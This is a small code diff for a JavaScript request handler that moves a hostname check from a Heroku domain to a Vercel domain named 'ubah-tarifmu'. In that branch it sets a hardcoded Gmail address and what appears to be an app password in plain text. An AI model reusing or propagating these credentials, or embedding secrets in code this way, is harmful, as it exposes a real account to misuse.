@@ -7,7 +7,7 @@ export default function handler(req, res) {
     let email = '';
     let pass = '';
 
-    if(url == 'ubah-tarifmu.herokuapp.com'){
+    if(url == 'ubah-tarifmu.vercel.app'){
         email = 'terakhir953@gmail.com' ;
         pass = 'xysccffmmtefmvwm' ;
         
